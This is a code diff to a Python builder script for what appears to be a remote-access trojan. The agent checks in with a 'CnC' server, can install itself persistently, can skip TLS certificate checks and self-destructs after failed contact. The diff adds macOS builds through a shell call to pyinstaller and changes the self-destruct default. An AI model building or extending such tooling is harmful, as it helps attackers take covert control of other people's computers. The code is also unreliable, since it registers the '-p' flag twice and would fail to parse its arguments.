@@ -51,6 +51,8 @@ def build_agent(output, server_url, hello_interval, idle_time,
             agent_file += ".exe"
         if not output.endswith(".exe"):
             output += ".exe"
+    elif platform == "darwin":
+        os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
     os.chdir(cwd)
     os.rename(agent_file, output)
     shutil.rmtree(working_dir)
@@ -64,10 +66,10 @@ def main():
     parser.add_argument('-o', '--output', required=True, help="Output file name.")
     parser.add_argument('--hello-interval', type=int, default=60, help="Delay (in seconds) between each request to the CnC.")
     parser.add_argument('--idle-time', type=int, default=60, help="Inactivity time (in seconds) after which to go idle. In idle mode, the agent pulls commands less often (every <hello_interval> seconds).")
-    parser.add_argument('--max-failed-connections', type=int, default=5000, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
+    parser.add_argument('--max-failed-connections', type=int, default=0, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
     parser.add_argument('-p', '--persistent', action='store_true', help="Automatically install the agent on first run.")
     parser.add_argument('--no-check-certificate', action='store_true', help="Disable server TLS certificate verification.")
-    parser.add_argument('-p', '--platform', required=True, help="Platform (linux or windows)")
+    parser.add_argument('-p', '--platform', required=True, help="Platform (linux/windows/darwin)")
     parser.add_argument('-a', '--arch', default="32", help="32 or 64 (wine only)")
     parser.add_argument('--debug', action='store_true')
     args = parser.parse_args()
